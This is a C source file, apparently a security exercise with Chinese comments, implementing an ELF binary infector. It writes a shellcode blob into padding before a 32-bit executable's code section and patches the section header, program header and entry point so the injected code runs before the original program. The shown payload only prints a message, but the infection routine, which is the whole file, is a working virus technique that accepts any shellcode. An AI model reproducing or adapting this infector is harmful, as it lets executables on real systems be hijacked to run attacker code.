#include "stdio.h"
#include "elf.h"

unsigned char inject_code[] = {
    0x60, 0xeb, 0x0d, 0x5a, 0x31, 0xc0, 0xcd, 0x90, 0x61, 0xbb,
    0x00, 0x00, 0x00, 0x00, 0xff, 0xe3, 0xe8, 0xee, 0xff, 0xff,
    0xff, 0x54, 0x68, 0x69, 0x73, 0x20, 0x66, 0x69, 0x6c, 0x65,
    0x20, 0x69, 0x73, 0x20, 0x69, 0x6e, 0x6a, 0x65, 0x63, 0x74,
    0x65, 0x64, 0x21, 0x0a, 0x0
};

# define BUF_SIZE 128
# define ADDR 10    // 在inject_code代码中的偏移为10的地方保存原来的入口地址

// 判断是否为elf文件
int is_elf(Elf32_Ehdr elf_ehdr) {
    // ELF文件头部的 e_ident 为 "0x7fELF"
    if (elf_ehdr.e_ident[0] == 0x7f && elf_ehdr.e_ident[1] == 0x45 &&
        elf_ehdr.e_ident[2] == 0x4c && elf_ehdr.e_ident[3] == 0x46) {
        return 1;
    }
    return 0;
}

// unsigned int类型按照字节划分
void cal_addr(Elf32_Addr entry, int addr[]) {
    int temp = entry;
    int i;
    for (i = 0; i < 4; i++) {
        addr[i] = temp % 256;  // 256 == 8byte
        temp /= 256;
    }
}

// inject shell code
int inject(char* elf_file) {
    Elf32_Ehdr elf_ehdr;  // elf head
    Elf32_Phdr elf_phdr;  // elf program head
    Elf32_Shdr elf_shdr;  // elf section head

    int fd = open(elf_file, O_RDWR);
    read(fd, &elf_ehdr, sizeof(Elf32_Ehdr));
    if(is_elf(elf_ehdr))    // 判断是否为elf文件
        printf("%s is a ELF , start to inject...\n", elf_file);
    else {
        printf("%s is not a ELF!\n", elf_file);
        return 0;
    }

    // 保存原来的入口地址以便后续返回
    Elf32_Addr old_entry = elf_ehdr.e_entry;
    int old_entry_addr[4];
    cal_addr(old_entry, old_entry_addr);
    printf("old_entry: 0x%x\n", old_entry);

    // 寻找注入点
    lseek(fd, elf_ehdr.e_shoff + elf_ehdr.e_shentsize, SEEK_SET);
    read(fd, &elf_shdr, sizeof(elf_shdr));  // 代码节的节头
    printf("elf_shdr.sh_offset == %d ", elf_shdr.sh_offset);
    int off = elf_shdr.sh_offset - sizeof(inject_code);
    lseek(fd, off, SEEK_SET);
    char buf[BUF_SIZE];
    int flag = 0;    // 是否找到注入点
    if(read(fd, &buf, BUF_SIZE)) {
        int i = 0;
        while(buf[i] == 0)
            i++;
        if(i >= sizeof(inject_code))
            flag = 1;
    }

    if(flag) {
        printf("Inject code offset: 0x%x\n", off);

        // 填入文件原来的入口地址
        inject_code[ADDR] = old_entry_addr[0];
        inject_code[ADDR + 1] = old_entry_addr[1];
        inject_code[ADDR + 2] = old_entry_addr[2];
        inject_code[ADDR + 3] = old_entry_addr[3];

        // 注入恶意代码
        lseek(fd, off, SEEK_SET);
        write(fd, &inject_code, sizeof(inject_code));

        // 修改代码节的节头
        elf_shdr.sh_offset -= sizeof(inject_code);
        elf_shdr.sh_size += sizeof(inject_code);
        elf_shdr.sh_addralign = 0;
        elf_shdr.sh_addr = off;
        lseek(fd, elf_ehdr.e_shoff + elf_ehdr.e_shentsize, SEEK_SET);
        write(fd, &elf_shdr, sizeof(elf_shdr));

        // 修改程序的入口点
        elf_ehdr.e_entry = off;
        lseek(fd, elf_ehdr.e_phoff, SEEK_SET);
        read(fd, &elf_phdr, sizeof(elf_phdr));
        elf_phdr.p_filesz += sizeof(inject_code);
        elf_phdr.p_memsz += sizeof(inject_code);
        elf_phdr.p_vaddr = off;
        elf_phdr.p_offset = off;
        elf_phdr.p_align = 0;
        printf("Modify entry address to 0x%x\n", elf_ehdr.e_entry);
        lseek(fd, 0, SEEK_SET);
        write(fd, &elf_ehdr, sizeof(elf_ehdr));
        lseek(fd, elf_ehdr.e_phoff, SEEK_SET);
        write(fd, &elf_phdr, sizeof(elf_phdr));

        close(fd);
        return 1;
    }
    else {
        printf("No enough space for inject!\n");
        return 0;
    }
}


int main(int argc, char** argv) {
    if (argc == 1) {
        printf("Please input inject <elf_filepath>!\n");
        exit(0);
    }
    if(inject(argv[1])) {
        printf("Success!\n");
    }
    else
        printf("Fail!\n");
    return 0;
}
